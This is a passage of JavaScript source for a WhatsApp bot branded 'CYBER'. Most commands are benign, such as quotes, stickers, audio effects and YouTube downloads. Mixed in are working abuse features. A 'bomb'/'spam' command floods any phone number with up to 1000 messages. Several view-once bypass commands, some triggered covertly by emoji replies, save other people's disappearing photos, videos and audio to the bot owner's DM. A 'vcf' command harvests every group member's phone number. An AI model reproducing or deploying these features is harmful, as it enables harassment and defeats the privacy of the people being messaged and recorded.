        const totalMembers = groupMetadata.participants.length;
        
        let online = [];
        let botJid = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
        
        // Method 1: Check presences store
        if (store && store.presences && store.presences[m.chat]) {
            const presences = store.presences[m.chat];
            
            for (let [jid, presence] of Object.entries(presences)) {
                // Check if user is online/available
                if (presence.lastKnownPresence === 'available' || 
                    presence.lastPresence === 'online' ||
                    presence.presences?.lastPresence === 'online') {
                    if (!online.includes(jid)) {
                        online.push(jid);
                    }
                }
            }
        }
        
        // Method 2: Get from group metadata (as fallback)
        if (online.length === 0) {
            // Show first 10 as "recently active" since we can't really know
            online = groupMetadata.participants.slice(0, 10).map(p => p.id);
        }
        
        // Add bot to list if not already there
        if (!online.includes(botJid)) {
            online.unshift(botJid); // Add bot at top
        }
        
        // Remove duplicates
        online = [...new Set(online)];
        
        if (online.length === 0) {
            return reply(`👤 *CYBER Online*\n\nNo members currently online in ${groupMetadata.subject}.`);
        }
        
        // Format message with group info
        let text = `🟢 *CYBER Online*\n\n`;
        text += `Group: ${groupMetadata.subject}\n`;
        text += `Total: ${totalMembers} members\n`;
        text += `Online: ${online.length} currently\n\n`;
        
        online.forEach((user, index) => {
            let emoji = user === botJid ? '🤖' : '👤';
            text += `${emoji} ${index + 1}. @${user.split('@')[0]}\n`;
        });
        
        text += `\n_Updated: ${new Date().toLocaleTimeString()}_`;
        
        await devtrust.sendMessage(m.chat, {
            text: text,
            mentions: online
        }, { quoted: m });
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Listonline error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Online*\n\nOnline checker is taking a nap. Try again later.`);
    }
}
break;

case 'gpt3': 
case 'open-%+%ai': 
case 'vxnxji': {
    if (!text) return reply(`🤖 *Example:* ${command} how are you?`);
    
    async function openai(text) {
        let response = await axios.post("https://chateverywhere.app/api/chat/", {
            model: { id: "gpt-3", name: "GPT-3" },
            messages: [{ content: text, role: "user" }],
            temperature: 0.5
        });
        return response.data;
    }

    try {
        let pei = await openai(text);
        reply(`🤖 *GPT-3*\n\n${pei}`);
    } catch (e) {
        reply("❌ *GPT-3 error* • Try later");
    }
}
break;

case 'quote': {
    try {
        const res = await fetch('https://zenquotes.io/api/random');
        const json = await res.json();
        const quote = json[0].q;
        const author = json[0].a;
        
        const quoteImg = `https://dummyimage.com/600x400/000/fff.png&text=${encodeURIComponent(`"${quote}"\n\n- ${author}`)}`;
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: quoteImg },
                caption: `_"${quote}"_\n— *${author}*`
            }),
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Quote failed*');
    }
}
break;

case 'joke': {
    try {
        let res = await fetch('https://v2.jokeapi.dev/joke/Any?type=single'); 
        let data = await res.json();
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: 'https://files.catbox.moe/smv12k.jpeg' },
                caption: `😂 *Joke*\n\n${data.joke}`
            }),
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Joke failed*');
    }
}
break;

case 'truth': {
    try {
        let res = await fetch('https://api.truthordarebot.xyz/v1/truth');
        let data = await res.json();
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: 'https://files.catbox.moe/smv12k.jpeg' },
                caption: `😳 *Truth*\n\n❖ ${data.question}`
            }),
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Truth failed*');
    }
}
break;

case 'dare': {
    try {
        let res = await fetch('https://api.truthordarebot.xyz/v1/dare');
        let data = await res.json();
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: 'https://files.catbox.moe/smv12k.jpeg' },
                caption: `😈 *Dare*\n\n❖ ${data.question}`
            }),
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Dare failed*');
    }
}
break;

case 'jid': {
    reply(from);
}
break;

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': 
case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': 
case 'smooth': case 'squirrel': {
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        else if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        else if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        else if (/earrape/.test(command)) set = '-af volume=12';
        else if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        else if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        else if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        else if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        else if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        else if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        else if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        else if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        
        if (set) {
            if (/audio/.test(mime)) {
                // Processing message (simple like your style)
                reply(`⚡ *ᴘʀᴏᴄᴇssɪɴɢ ${command.toUpperCase()} ᴇғғᴇᴄᴛ...*`);
                
                // FIXED: changed 'bad' to 'devtrust'
                let media = await devtrust.downloadAndSaveMediaMessage(quoted);
                let ran = getRandom('.mp3');
                
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media);
                    if (err) {
                        console.error(`ғғᴍᴘᴇɢ ᴇʀʀᴏʀ: ${err}`);
                        return reply(`❌ *ғᴀɪʟᴇᴅ ᴛᴏ ᴀᴘᴘʟʏ ${command.toUpperCase()} ᴇғғᴇᴄᴛ*`);
                    }
                    
                    let buff = fs.readFileSync(ran);
                    // FIXED: changed 'bad' to 'devtrust'
                    devtrust.sendMessage(m.chat, 
                        addNewsletterContext({
                            audio: buff,
                            mimetype: 'audio/mpeg'
                        }), 
                        { quoted: m }
                    );
                    fs.unlinkSync(ran);
                });
            } else {
                reply(`🎵 *Reply to audio with ${prefix + command}*`);
            }
        } else {
            reply(`❌ *Invalid effect*\nᴜsᴇ: .bass, .blown, .deep, .earrape, .fast, .fat, .nightcore, .reverse, .robot, .slow, .smooth, .squirrel`);
        }
    } catch (e) {
        reply(`❌ *Error:* ${e.message}`);
    }
    break;
}

case 'say':
case 'tts':
case 'gtts': {
    if (!text) return reply("🗣️ *What should I say?*");

    const ttsUrl = googleTTS.getAudioUrl(text, {
        lang: "en",
        slow: false,
        host: "https://translate.google.com",
    });

    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            audio: { url: ttsUrl },
            mimetype: "audio/mp4",
            ptt: true,
            fileName: `${text}.mp3`,
            caption: `🔊 *Saying:* ${text}`
        }),
        { quoted: m }
    );
}
break;

case "rwaifu": {
    const imageUrl = `https://apis.davidcyriltech.my.id/random/waifu`;
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: imageUrl },
            caption: "✨ *Random Waifu*"
        }),
        { quoted: m }
    );
}
break;

case 'waifu': {
    try {
        const waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: waifudd.data.url },
                caption: "✨ *Waifu*"
            }),
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Error*');
    }
}
break;

case 'vv':
case 'vvgh': {
    if (!m.quoted) return;
    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        let media = await m.quoted.download();
        let botNumber = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
        if (/image/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                image: media,
                caption: `📸 *View-Once Image*\nFrom: @${m.sender.split('@')[0]}\nChat: ${m.chat.includes('g.us') ? 'Group' : 'Private'}\nTime: ${new Date().toLocaleString()}`,
                mentions: [m.sender]
            });
        } else if (/video/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                video: media,
                caption: `🎥 *View-Once Video*\nFrom: @${m.sender.split('@')[0]}\nChat: ${m.chat.includes('g.us') ? 'Group' : 'Private'}\nTime: ${new Date().toLocaleString()}`,
                mentions: [m.sender]
            });
        } else if (/audio/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true
            });
        }
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (error) {
        console.error('vv error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
}
break;

case 'vv2':
case 'readviewonce2': {
    if (!m.quoted) return;
    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        let media = await m.quoted.download();
        let botNumber = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
        if (/image/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                image: media,
                caption: `📸 *View-Once Image*\nFrom: @${m.sender.split('@')[0]}\nChat: ${m.chat.includes('g.us') ? 'Group' : 'Private'}\nTime: ${new Date().toLocaleString()}`,
                mentions: [m.sender]
            });
        } else if (/video/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                video: media,
                caption: `🎥 *View-Once Video*\nFrom: @${m.sender.split('@')[0]}\nChat: ${m.chat.includes('g.us') ? 'Group' : 'Private'}\nTime: ${new Date().toLocaleString()}`,
                mentions: [m.sender]
            });
        } else if (/audio/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true
            });
        }
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error('vv2 error:', err);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
}
break;

case '😭':
case '🌚':
case '🤭':
case '🔥':
case '😋':
case '😊':
case '😘':
case '😎': {
    if (!m.quoted) return;
    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        let media = await m.quoted.download();
        let botNumber = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
        if (/image/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                image: media,
                caption: `📸 *View-Once Image*\nFrom: @${m.sender.split('@')[0]}\nChat: ${m.chat.includes('g.us') ? 'Group' : 'Private'}\nTime: ${new Date().toLocaleString()}`,
                mentions: [m.sender]
            });
        } else if (/video/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                video: media,
                caption: `🎥 *View-Once Video*\nFrom: @${m.sender.split('@')[0]}\nChat: ${m.chat.includes('g.us') ? 'Group' : 'Private'}\nTime: ${new Date().toLocaleString()}`,
                mentions: [m.sender]
            });
        } else if (/audio/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true
            });
        }
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error('Emoji vv error:', err);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
}
break;

case 'save':
case 'download':
case 'svt': {
    if (!isCreator) {
        return reply(`🔒 *CYBER Save*\n\nOwner only command.`);
    }
    
    if (!m.quoted) {
        return reply(`💾 *CYBER Save*\n\nReply to any media to save it.`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '💾', key: m.key } });
        
        let media = await m.quoted.download();
        let mime = (m.quoted.msg || m.quoted).mimetype || '';
        let botNumber = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
        
        if (/image/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                image: media,
                caption: `📸 From: ${m.sender.split('@')[0]}`
            });
            reply(`✅ *CYBER Save*\n\nImage saved to bot's DM.`);
            
        } else if (/video/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                video: media,
                caption: `🎥 From: ${m.sender.split('@')[0]}`
            });
            reply(`✅ *CYBER Save*\n\nVideo saved to bot's DM.`);
            
        } else if (/audio/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg'
            });
            reply(`✅ *CYBER Save*\n\nAudio saved to bot's DM.`);
            
        } else {
            reply(`❌ *CYBER Save*\n\nUnsupported media type.`);
        }
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (err) {
        console.error('Save error:', err);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Save*\n\nFailed to save media.`);
    }
}
break;

case 'qc': {
    if (!text) return reply('💬 *Example:* qc Your quote here');

    const name = m.pushName || 'User';
    const quote = text.trim();

    let profilePic;
    try {
        profilePic = await devtrust.profilePictureUrl(m.sender, 'image');
    } catch {
        profilePic = 'https://telegra.ph/file/6880771c1f1b5954d7203.jpg';
    }

    const url = `https://www.laurine.site/api/generator/qc?text=${encodeURIComponent(quote)}&name=${encodeURIComponent(name)}&photo=${encodeURIComponent(profilePic)}`;

    try {
        await devtrust.sendImageAsSticker(m.chat, url, m, {
            packname: "CYBER",
            author: "Quote"
        });
    } catch (err) {
        reply('❌ *Quote sticker failed*');
    }
}
break;

case 'shorturl': {
    if (!text) return reply('🔗 *Provide a URL*');
    
    try {
        let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
        if (!shortUrl1) return reply(`❌ *Failed to shorten URL*`);
        
        reply(`🔗 *Shortened*\n${shortUrl1}`);
    } catch (e) {
        reply('❌ *Error*');
    }
}
break;

case 'unblock': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : 
                m.quoted ? m.quoted.sender : 
                text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    await devtrust.updateBlockStatus(users, 'unblock');
    reply(`✅ *User unblocked*`);
}
break;

case 'block': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : 
                m.quoted ? m.quoted.sender : 
                text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    await devtrust.updateBlockStatus(users, 'block');
    reply(`🚫 *User blocked*`);
}
break;

case 'creategc':
case 'creategroup': {
    if (!isCreator) return reply("🔒 *Owner only*");

    const groupName = args.join(" ");
    if (!groupName) return reply(`📝 *Usage:* ${prefix + command} Group Name`);

    try {
        const cret = await devtrust.groupCreate(groupName, []);
        const code = await devtrust.groupInviteCode(cret.id);
        const link = `https://chat.whatsapp.com/${code}`;

        const teks = `✅ *Group Created*\n\n` +
            `💳 Name: ${cret.subject}\n` +
            `👤 Owner: @${cret.owner.split("@")[0]}\n` +
            `🔗 ${link}`;

        devtrust.sendMessage(m.chat, {
            text: teks,
            mentions: [cret.owner]
        }, { quoted: m });

    } catch (e) {
        reply("❌ *Failed to create group*");
    }
}
break;

case 'tgstickers': {
    return reply("❌ *This feature has been removed.*");
}
break;

case "savecontact": 
case "vcf": 
case "scontact": 
case "savecontacts": {
    if (!m.isGroup) {
        return reply("👥 *Groups only*");
    }

    try {
        let metadata = await devtrust.groupMetadata(m.chat);
        let participants = metadata.participants;
        let vcard = "";
        let noPort = 1;

        for (let a of participants) {
            let num = a.id.split("@")[0];
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${num}\nTEL;type=CELL;type=VOICE;waid=${num}:+${num}\nEND:VCARD\n`;
        }

        let filePath = "./contacts.vcf";
        fs.writeFileSync(filePath, vcard.trim());

        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                document: fs.readFileSync(filePath),
                mimetype: "text/vcard",
                fileName: `${metadata.subject}.vcf`,
                caption: `📇 *${participants.length} contacts saved*`
            }), 
            { quoted: m }
        );

        fs.unlinkSync(filePath);
    } catch (err) {
        reply("⚠️ Error: " + err.toString());
    }
}
break;

case 'toimg': {
    const quoted = m.quoted ? m.quoted : null;
    const mime = (quoted?.msg || quoted)?.mimetype || '';
    
    if (!quoted) return reply('🖼️ *Reply to a sticker*');
    if (!/webp/.test(mime)) return reply(`❌ *Reply to a sticker with ${prefix}toimg*`);
    
    if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp');
    
    const media = await devtrust.downloadMediaMessage(quoted);
    const filePath = `./tmp/${Date.now()}.jpg`;
    
    fs.writeFileSync(filePath, media);
    
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: fs.readFileSync(filePath)
        }),
        { quoted: m }
    );
    
    fs.unlinkSync(filePath);
}
break;

case 'tosticker':
case 'sticker':
case 's': {
    if (!m.quoted) {
        return reply(`🎨 *CYBER Sticker Maker*\n\nReply to an image or video with:\n${prefix}${command}\n\nVideo limit: Max 10 seconds`);
    }
    
    const mime = (m.quoted.msg || m.quoted).mimetype || '';
    const mediaType = (m.quoted.msg || m.quoted).seconds || 0;
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });
        
        // Image to sticker
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await devtrust.sendImageAsSticker(m.chat, media, m, { 
                packname: global.packname || "CYBER", 
                author: global.author || "GAME CHANGER" 
            });
        }
        
        // Video to sticker
        else if (/video/.test(mime)) {
            // Check video duration
            if (mediaType > 10) {
                return reply(`❌ *CYBER Sticker Maker*\n\nVideo too long: ${mediaType}s\nMax duration: 10 seconds`);
            }
            
            let media = await m.quoted.download();
            await devtrust.sendVideoAsSticker(m.chat, media, m, { 
                packname: global.packname || "CYBER", 
                author: global.author || "GAME CHANGER" 
            });
        }
        
        else {
            return reply(`❌ *CYBER Sticker Maker*\n\nInvalid media. Reply to an image or video.\n\nSupported:\n• Images (jpg, png, webp)\n• Videos (mp4, webm, gif) max 10s`);
        }
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Sticker error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Sticker Maker*\n\nSticker machine is jammed. Try again later.`);
    }
}
break;

case 'play':
case 'ytmp3': {
    if (!text) return reply(`🎵 *CYBER Play*\n\nUsage: ${prefix}play [song name or YouTube URL]\nExample: ${prefix}play faded`);
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🎧', key: m.key } });
        reply(`🔍 Searching: ${text}...`);

        const yts = require('yt-search');
        let videoUrl = text;
        let videoInfo = null;

        if (text.includes('youtube.com') || text.includes('youtu.be')) {
            videoUrl = text;
        } else {
            const { videos } = await yts(text);
            if (!videos?.length) {
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                return reply(`❌ *"${text}"* nahi mila. Koi aur naam try karo.`);
            }
            videoInfo = videos.filter(v => !v.live)[0] || videos[0];
            videoUrl = videoInfo.url;
        }

        const result = await ytAudio(videoUrl);
        if (result.error || result.code !== 200) throw new Error(result.message || 'Download failed');

        const d = result.data;
        if (!d.best_audio && !d.audio_formats?.length) throw new Error('No audio format found');

        const audioFmt = d.best_audio || d.audio_formats[0];
        const titleStr = d.title || videoInfo?.title || 'Unknown';
        const thumb    = d.thumbnail || videoInfo?.thumbnail || null;
        const dur      = d.duration_formatted || videoInfo?.timestamp || 'N/A';

        const safeTitle = titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50);
        const audioCaption = `🎵 *${titleStr}*\n⏱️ ${dur}\n🎚️ ${audioFmt.quality} ${audioFmt.format} — ${audioFmt.size}`;

        // Download buffer + send thumbnail in parallel
        const [audioBuf] = await Promise.all([
            axios.get(audioFmt.url, {
                responseType: 'arraybuffer',
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                timeout: 180000,
                maxContentLength: 200 * 1024 * 1024
            }).then(r => Buffer.from(r.data)),
            thumb ? devtrust.sendMessage(m.chat, addNewsletterContext({ image: { url: thumb }, caption: audioCaption }), { quoted: m }) : Promise.resolve()
        ]);

        await devtrust.sendMessage(m.chat, addNewsletterContext({
            audio: audioBuf,
            mimetype: 'audio/mpeg',
            fileName: `${safeTitle}.mp3`
        }), { quoted: m });
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Play Error:', error.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Play failed:* ${error.message}`);
    }
}
break;

case 'bomb':
case 'spam': {
    const q = m.message?.conversation ||
              m.message?.extendedTextMessage?.text || '';
    const [target, text, countRaw] = q.split(',').map(x => x?.trim());

    const count = parseInt(countRaw) || 5;

    if (!isOwner || !target || !text || !count) {
        return reply('📌 *Usage:* spam number,message,count');
    }

    const jid = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;

    if (count > 1000) {
        return reply('❌ *Max 1000 messages*');
    }

    reply(`💣 *Spamming ${target} with ${count} messages*`);

    for (let i = 0; i < count; i++) {
        await devtrust.sendMessage(jid, { text });
        await delay(700);
    }

    reply(`✅ *Spam complete*`);
    break;
}

case 'play2': {
    if (!text) return reply(`🎵 *CYBER Play2*\n\nUsage: ${prefix}play2 [song name or YouTube URL]\nExample: ${prefix}play2 faded`);
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        reply(`🔍 Searching: ${text}...`);

        const yts = require('yt-search');
        let videoUrl = text;
        let videoInfo = null;

        if (text.includes('youtube.com') || text.includes('youtu.be')) {
            videoUrl = text;
        } else {
            const { videos } = await yts(text);
            if (!videos?.length) {
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                return reply(`❌ *"${text}"* nahi mila. Koi aur naam try karo.`);
            }
            videoInfo = videos.filter(v => !v.live)[0] || videos[0];
            videoUrl = videoInfo.url;
        }

        const result = await ytDownload(videoUrl);
        if (result.error || result.code !== 200) throw new Error(result.message || 'Download failed');

        const d = result.data;
        if (!d.best_audio && !d.audio_formats?.length) throw new Error('No audio format found');

        const audioFmt = d.best_audio || d.audio_formats[0];
        const titleStr = d.title || videoInfo?.title || 'Unknown';
        const thumb    = d.thumbnail || videoInfo?.thumbnail || null;
        const dur      = d.duration_formatted || videoInfo?.timestamp || 'N/A';

        const safeTitle2 = titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50);
        const audioCaption2 = `🎵 *${titleStr}*\n⏱️ ${dur}\n🎚️ ${audioFmt.quality} ${audioFmt.format} — ${audioFmt.size}`;

        // Download buffer + send thumbnail in parallel
        const [audioBuf2] = await Promise.all([
            axios.get(audioFmt.url, {
                responseType: 'arraybuffer',
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                timeout: 180000,
                maxContentLength: 200 * 1024 * 1024
            }).then(r => Buffer.from(r.data)),
            thumb ? devtrust.sendMessage(m.chat, addNewsletterContext({ image: { url: thumb }, caption: audioCaption2 }), { quoted: m }) : Promise.resolve()
        ]);

        await devtrust.sendMessage(m.chat, addNewsletterContext({
            audio: audioBuf2,
            mimetype: 'audio/mpeg',
            fileName: `${safeTitle2}.mp3`
        }), { quoted: m });
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Play2 Error:', error.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Play2 failed:* ${error.message}`);
    }
}
break;

case 'ytmp4':
case 'video':
case 'mp4':
case 'ytvideo': {
    if (!text) {
        return reply(`🎬 *YouTube Video Downloader*\n\nUsage: ${prefix}video <song name or YouTube link>\nExample: ${prefix}video shape of you\nExample: ${prefix}video https://youtu.be/dQw4w9WgXcQ`);
    }
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        // ── 1. Resolve URL (search by name if not a direct link) ─────────────
        let videoUrl = text;
        let videoInfo = null;
        const yts = require('yt-search');
        if (text.includes('youtube.com') || text.includes('youtu.be')) {
            let videoId = null;
            if (text.includes('/shorts/')) {
                videoId = text.split('/shorts/')[1].split('?')[0].split('/')[0].trim();
            } else {
                videoId = text.match(/(?:youtube\.com\/(?:[^/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?/\s]{11})/i)?.[1];
            }
            if (videoId) {
                const r = await yts({ videoId });
                videoInfo = ('videos' in r && Array.isArray(r.videos)) ? r.videos[0] : r;
            }
        } else {
            const { videos } = await yts(text);
            if (!videos?.length) {
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                return reply('❌ No results found. Try a YouTube link instead.');
            }
            videoInfo = videos.filter(v => !v.live)[0] || videos[0];
            videoUrl = videoInfo.url;
        }

        // ── 2. Fetch all formats via VidsSave API ─────────────────────────────
        const result = await ytDownload(videoUrl);
        if (!result?.data) throw new Error('Could not fetch video info');

        const info      = result.data;
        const vidFmts   = info.video_formats || [];
        const audioFmts = info.audio_formats || [];

        if (!vidFmts.length && !info.best_video) throw new Error('No video formats found');

        // Build quality menu from actual available formats
        const menuFmts = vidFmts.length ? vidFmts : [info.best_video];
        const qualityMenu = menuFmts.map((f, i) => `*${i + 1}.* ${f.quality} — ${f.format} (${f.size_mb})`).join('\n');

        // ── 3. Show info card with quality menu ───────────────────────────────
        const thumb = videoInfo?.thumbnail || (info.thumbnail ? info.thumbnail : null);
        const titleStr = info.title || videoInfo?.title || 'Unknown Title';
        const duration = info.duration_formatted || videoInfo?.timestamp || 'N/A';
        const channel  = videoInfo?.author?.name || 'Unknown';
        const views    = videoInfo?.views ? videoInfo.views.toLocaleString() : 'N/A';

        const caption =
            `🎬 *${titleStr}*\n\n` +
            `⏱️ *Duration:* ${duration}\n` +
            `👤 *Channel:* ${channel}\n` +
            `👀 *Views:* ${views}\n\n` +
            `📋 *Available Qualities:*\n${qualityMenu}\n\n` +
            `📌 *Reply with a number* to download that quality`;

        const sentMsg = await devtrust.sendMessage(
            m.chat,
            addNewsletterContext(thumb
                ? { image: { url: thumb }, caption }
                : { text: caption }),
            { quoted: m }
        );

        // ── 4. Wait for user quality selection ────────────────────────────────
        const _videoHandler = async (messageUpdate) => {
            try {
                const msgData  = messageUpdate?.messages[0];
                if (!msgData?.message) return;
                const replyTxt = (msgData.message.extendedTextMessage?.text || msgData.message.conversation || '').trim();
                const stanzaId = msgData.message.extendedTextMessage?.contextInfo?.stanzaId;
                if (stanzaId !== sentMsg?.key?.id) return;
                const sel = parseInt(replyTxt);
                if (isNaN(sel) || sel < 1 || sel > menuFmts.length) return;

                devtrust.ev.off('messages.upsert', _videoHandler);
                await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: msgData.key } });

                const chosen = menuFmts[sel - 1];
                const fetchMsg = await devtrust.sendMessage(
                    m.chat,
                    { text: `🎬 *Downloading ${chosen.quality} (${chosen.size_mb})...*\nPlease wait ⏳` },
                    { quoted: msgData }
                );

                // ── 5. Download buffer and send as actual file ────────────────
                const chosenUrl = chosen.download_url || chosen.url;
                const fileName  = `${titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}_${chosen.quality}.mp4`;

                const videoResp = await axios.get(chosenUrl, {
                    responseType: 'arraybuffer',
                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                    timeout: 300000,
                    maxContentLength: 500 * 1024 * 1024
                });
                const videoBuf = Buffer.from(videoResp.data);
                const sizeMB   = (videoBuf.length / 1024 / 1024).toFixed(2);

                await devtrust.sendMessage(m.chat, { delete: fetchMsg.key });
                await devtrust.sendMessage(m.chat, {
                    video: videoBuf,
                    caption: `🎬 *${titleStr}*\n🎚️ *Quality:* ${chosen.quality}\n📦 *Size:* ${sizeMB} MB`,
                    mimetype: 'video/mp4',
                    fileName
                }, { quoted: msgData });
                await devtrust.sendMessage(m.chat, { react: { text: '✅', key: msgData.key } });

            } catch (err) {
                console.error('Video quality handler error:', err.message);
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                reply(`❌ Download failed: ${err.message}`);
            }
        };
        devtrust.ev.on('messages.upsert', _videoHandler);
        setTimeout(() => devtrust.ev.off('messages.upsert', _videoHandler), 180000);

    } catch (err) {
        console.error('Video command error:', err.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ Failed: ${err.message}`);
    }
}
break;

case 'ytdl':
case 'ytdown': {
    if (!text) return reply(`🎬 *YouTube Downloader (VidsSave)*\n\nUsage: ${prefix + command} <YouTube URL>\nExample: ${prefix + command} https://youtu.be/dQw4w9WgXcQ\n\nSupports: Video (144P–2160P) + Audio formats`)
    const isYtUrl = text.includes('youtube.com') || text.includes('youtu.be')
    if (!isYtUrl) return reply(`❌ *Please send a valid YouTube URL*\nExample: ${prefix + command} https://youtu.be/dQw4w9WgXcQ`)
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
        const result = await ytDownload(text)
        const d = result.data
        const vList = d.video_formats.map((v, i) => `${i + 1}. 🎬 ${v.quality} ${v.format} — ${v.size_mb}`).join('\n')
        const aList = d.audio_formats.map((a, i) => `${d.video_formats.length + i + 1}. 🎵 ${a.quality} ${a.format} — ${a.size_mb}`).join('\n')
        const menu = `🎬 *${d.title}*\n⏱️ *Duration:* ${d.duration_formatted || 'N/A'}\n\n*Video Formats:*\n${vList}\n\n*Audio Formats:*\n${aList}\n\n📌 Reply with number to download`
        const sentMsg = await devtrust.sendMessage(m.chat,
            { image: { url: d.thumbnail }, caption: menu },
            { quoted: m }
        )
        const allFormats = [...d.video_formats, ...d.audio_formats]
        const _ytdlHandler = async (messageUpdate) => {
            try {
